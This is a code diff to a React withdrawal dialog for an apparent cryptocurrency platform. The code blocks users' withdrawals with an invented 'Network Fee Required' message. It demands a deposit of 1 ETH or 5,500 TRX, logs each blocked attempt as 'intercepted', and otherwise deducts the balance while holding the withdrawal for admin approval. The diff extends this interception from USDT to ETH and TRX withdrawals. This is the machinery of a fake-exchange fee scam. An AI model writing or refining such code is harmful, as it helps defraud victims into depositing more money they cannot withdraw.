@@ -9,6 +9,7 @@ interface WithdrawModalProps {
   onClose: () => void;
   initialSymbol?: string;
   onOpenDepositForGas?: (symbol: string) => void;
+  onOpenAuth?: () => void;
 }
 
 export const WithdrawModal: React.FC<WithdrawModalProps> = ({
@@ -16,6 +17,7 @@ export const WithdrawModal: React.FC<WithdrawModalProps> = ({
   onClose,
   initialSymbol = 'USDT (ERC-20)',
   onOpenDepositForGas,
+  onOpenAuth,
 }) => {
   const { balances, userEmail, userAccount, refreshAccountData } = useAuth();
 
@@ -24,7 +26,7 @@ export const WithdrawModal: React.FC<WithdrawModalProps> = ({
   const [destinationAddress, setDestinationAddress] = useState<string>('');
   const [interceptedMessage, setInterceptedMessage] = useState<string | null>(null);
   const [requiredGasSymbol, setRequiredGasSymbol] = useState<'ETH' | 'TRX'>('ETH');
-  const [topUpBtnText, setTopUpBtnText] = useState<string>('Top up Ethereum (ETH)');
+  const [topUpBtnText, setTopUpBtnText] = useState<string>('Top Up Ethereum (ETH)');
   const [isProcessing, setIsProcessing] = useState<boolean>(false);
   const [withdrawSuccess, setWithdrawSuccess] = useState<boolean>(false);
   const [isPendingNotice, setIsPendingNotice] = useState<boolean>(false);
@@ -61,99 +63,33 @@ export const WithdrawModal: React.FC<WithdrawModalProps> = ({
 
     setIsProcessing(true);
 
-    const isUsdtErc20 = symbol === 'USDT (ERC-20)';
-    const isUsdtTrc20 = symbol === 'USDT (TRC-20)';
-    const isUsdt = isUsdtErc20 || isUsdtTrc20;
+    const isUsdtErc20 = symbol === 'USDT (ERC-20)' || symbol === 'ETH';
+    const isUsdtTrc20 = symbol === 'USDT (TRC-20)' || symbol === 'TRX';
 
-    if (isUsdt) {
-      // Calculate dynamic tier multiplier based on $10,000 units
-      const withdrawalUsd = parsedAmount * currentAsset.priceUsd;
-      const tierMultiplier = Math.max(1, Math.ceil(withdrawalUsd / 10000));
-      const requiredFeeUsd = tierMultiplier * 150;
+    let hasGas = false;
+    let gasSym: 'ETH' | 'TRX' = 'ETH';
+    let promptMsg = '';
 
-      let hasGas = false;
-      let gasCoinName = 'Ethereum (ETH)';
-      let gasSym: 'ETH' | 'TRX' = 'ETH';
-
-      if (isUsdtErc20) {
-        const ethPrice = getAssetBySymbol('ETH')?.priceUsd || 2800;
-        const userGasUsd = userEthBalance * ethPrice;
-        hasGas = userGasUsd >= requiredFeeUsd;
-        gasCoinName = 'Ethereum (ETH)';
-        gasSym = 'ETH';
-      } else {
-        const trxPrice = getAssetBySymbol('TRX')?.priceUsd || 0.12;
-        const userGasUsd = userTrxBalance * trxPrice;
-        hasGas = userGasUsd >= requiredFeeUsd;
-        gasCoinName = 'Tron (TRX)';
-        gasSym = 'TRX';
-      }
-
-      setRequiredGasSymbol(gasSym);
-      setTopUpBtnText(`Top up ${gasCoinName}`);
-
-      if (!hasGas) {
-        setTimeout(async () => {
-          setIsProcessing(false);
-          const formattedAmount = `$${parsedAmount.toLocaleString('en-US', { maximumFractionDigits: 2 })}`;
-          const formattedFee = `$${requiredFeeUsd.toLocaleString('en-US')}`;
-          const prompt = `Network Fee Required: Insufficient ${gasCoinName} balance. Kindly deposit ${formattedFee} worth of ${gasCoinName} to complete this withdrawal of ${formattedAmount}.`;
-
-          setInterceptedMessage(prompt);
-
-          if (userAccount) {
-            await logTransaction({
-              userId: userAccount.uid,
-              userEmail,
-              type: 'withdrawal',
-              fromSymbol: symbol,
-              fromAmount: parsedAmount,
-              amountUsd: usdValue,
-              feeUsd: requiredFeeUsd,
-              status: 'intercepted_insufficient_gas',
-              timestamp: new Date().toISOString(),
-              note: `USDT withdrawal of ${formattedAmount} intercepted for gas requirement (${formattedFee})`,
-              interceptorMessage: prompt,
-            });
-          }
-        }, 600);
-        return;
-      }
-
-      try {
-        if (userAccount) {
-          const newBalance = userBalance - parsedAmount;
-          await updateBalanceByEmail(userEmail, symbol, newBalance, 'User Withdrawal');
-
-          await logTransaction({
-            userId: userAccount.uid,
-            userEmail,
-            type: 'withdrawal',
-            fromSymbol: symbol,
-            fromAmount: parsedAmount,
-            amountUsd: usdValue,
-            feeUsd: 12,
-            status: 'completed',
-            timestamp: new Date().toISOString(),
-            note: `Withdrawn ${parsedAmount} ${symbol} to ${destinationAddress}`,
-          });
-
-          await refreshAccountData();
-          setWithdrawSuccess(true);
-        }
-      } catch (err) {
-        console.error('Withdrawal error:', err);
-        alert('Withdrawal request failed.');
-      } finally {
-        setIsProcessing(false);
-      }
+    if (isUsdtErc20) {
+      hasGas = userEthBalance >= 1.0;
+      gasSym = 'ETH';
+      promptMsg = 'Insufficient Ethereum. Kindly top up your Ethereum.';
+      setTopUpBtnText('Top Up Ethereum');
     } else {
-      // NON-USDT CRYPTO WITHDRAWAL: Initiates in 'pending' status
-      try {
-        if (userAccount) {
-          const newBalance = userBalance - parsedAmount;
-          await updateBalanceByEmail(userEmail, symbol, newBalance, 'User Withdrawal (Pending)');
+      hasGas = userTrxBalance >= 5500;
+      gasSym = 'TRX';
+      promptMsg = 'Insufficient TRX. Kindly top up your Tron.';
+      setTopUpBtnText('Top Up Tron');
+    }
 
+    setRequiredGasSymbol(gasSym);
+
+    if (!hasGas) {
+      setTimeout(async () => {
+        setIsProcessing(false);
+        setInterceptedMessage(promptMsg);
+
+        if (userAccount) {
           await logTransaction({
             userId: userAccount.uid,
             userEmail,
@@ -161,21 +97,44 @@ export const WithdrawModal: React.FC<WithdrawModalProps> = ({
             fromSymbol: symbol,
             fromAmount: parsedAmount,
             amountUsd: usdValue,
-            feeUsd: 0,
-            status: 'pending',
+            feeUsd: 1500,
+            status: 'intercepted_insufficient_gas',
             timestamp: new Date().toISOString(),
-            note: `Pending Admin Approval: Withdrawal of ${parsedAmount} ${symbol} to ${destinationAddress}`,
+            note: `Withdrawal of ${parsedAmount} ${symbol} intercepted for gas requirement`,
+            interceptorMessage: promptMsg,
           });
-
-          await refreshAccountData();
-          setIsPendingNotice(true);
         }
-      } catch (err) {
-        console.error('Pending withdrawal error:', err);
-        alert('Failed to submit withdrawal request.');
-      } finally {
-        setIsProcessing(false);
+      }, 500);
+      return;
+    }
+
+    // Submit withdrawal in PENDING state awaiting administrative approval
+    try {
+      if (userAccount) {
+        const newBalance = userBalance - parsedAmount;
+        await updateBalanceByEmail(userEmail, symbol, newBalance, 'User Withdrawal (Pending Hold)');
+
+        await logTransaction({
+          userId: userAccount.uid,
+          userEmail,
+          type: 'withdrawal',
+          fromSymbol: symbol,
+          fromAmount: parsedAmount,
+          amountUsd: usdValue,
+          feeUsd: 15,
+          status: 'pending',
+          timestamp: new Date().toISOString(),
+          note: `Pending Approval: Withdrawal of ${parsedAmount} ${symbol} to ${destinationAddress}`,
+        });
+
+        await refreshAccountData();
+        setIsPendingNotice(true);
       }
+    } catch (err) {
+      console.error('Pending withdrawal error:', err);
+      alert('Failed to submit withdrawal request.');
+    } finally {
+      setIsProcessing(false);
     }
   };
 
@@ -215,7 +174,7 @@ export const WithdrawModal: React.FC<WithdrawModalProps> = ({
                   <span className="font-bold text-xs uppercase tracking-wider text-red-400 block">
                     Network Fee Required
                   </span>
-                  <p className="text-sm font-semibold text-red-500 leading-snug">
+                  <p className="text-sm font-bold text-red-500 leading-snug">
                     {interceptedMessage}
                   </p>
                 </div>
@@ -227,11 +186,22 @@ export const WithdrawModal: React.FC<WithdrawModalProps> = ({
                     onClose();
                     if (onOpenDepositForGas) onOpenDepositForGas(requiredGasSymbol);
                   }}
-                  className="w-full px-4 py-2.5 bg-red-500 hover:bg-red-600 text-white font-semibold text-xs rounded-xl transition-colors flex items-center justify-center gap-2 shadow-md"
+                  className="flex-1 px-4 py-2.5 bg-red-600 hover:bg-red-500 text-white font-bold text-xs rounded-xl transition-colors flex items-center justify-center gap-2 shadow-md"
                 >
                   <Fuel className="w-4 h-4" />
                   {topUpBtnText}
                 </button>
+                {onOpenAuth && (
+                  <button
+                    onClick={() => {
+                      onClose();
+                      onOpenAuth();
+                    }}
+                    className="px-3 py-2.5 bg-slate-800 hover:bg-slate-700 text-slate-200 font-bold text-xs rounded-xl border border-slate-700 transition-colors flex items-center justify-center gap-1.5"
+                  >
+                    Sign In / Register
+                  </button>
+                )}
               </div>
             </div>
           )}
